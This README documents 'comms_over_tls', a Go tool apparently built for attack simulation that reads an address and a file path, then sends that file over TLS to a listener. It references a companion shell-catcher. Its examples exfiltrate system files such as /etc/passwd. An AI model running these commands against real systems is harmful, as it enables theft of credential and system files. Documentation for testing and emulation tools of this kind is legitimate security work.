Comms over TLS
===============
Nearly the same as [`argv_from_file_descriptor`](../argv_from_file_descriptor)
but uses TLS for its comms instead of plaintext TCP.

A crude shell-catcher may be found in the
[`letsencryptshellcatcher`](../letsencryptshellcatcher) directory.

File Descriptor
---------------
The address and file as whitespace-separated words from file descriptor 7, and
override the environment variables.  If only one word is read, it is taken to
be the address.

### Examples
Set the address and file via a heredoc:
```sh
./comms_over_tls 7<<_eof
localhost:5555 /etc/passwd
_eof
```

Set just the address via bash's Here String:
```sh
./bin/comms_over_tls 7<<<"localhost:5555"
```

Environment Variables
---------------------
The address and file may be set with environment variables, overriding
compile-time settings, as follows

Default Variable   | Description
-------------------|------------
`ALPT4ATS_ADDRESS` | TLS Server Address
`ALPT4ATS_FILE`    | File to send on the TLS connection

The variable names may be changed at compile-time, as below.

Compile-time Config
-------------------
Compile time configuration is possible with the linker's `-X` (as in 
`go build -ldflags '-X main.Foo=bar'`).  The variables are as follows

Variable                                        | Default            | Description
------------------------------------------------|--------------------|------------
[`main.Address`](./comms_over_tls.go#L26)       | `localhost:4444`   | TLS Server Address
[`main.AddressEnvVar`](./comms_over_tls.go#L27) | `ALPT4ATS_ADDRESS` | Environment variable which sets the TLS Server Address
[`main.File`](./comms_over_tls.go#L28)          | `/etc/hosts`       | File to send on the TLS connection
[`main.FileEnvVar`](./comms_over_tls.go#L29)    | `ALPT4ATS_FILE`    | Environment variable which sets the File to send on the TLS connection

When building with the [Makefile](../../Makefile) these may be passed in with
the `LINKFLAGS` environment variable, as in
```sh
LINKFLAGS="-X main.Address=example.com:8080" make
```
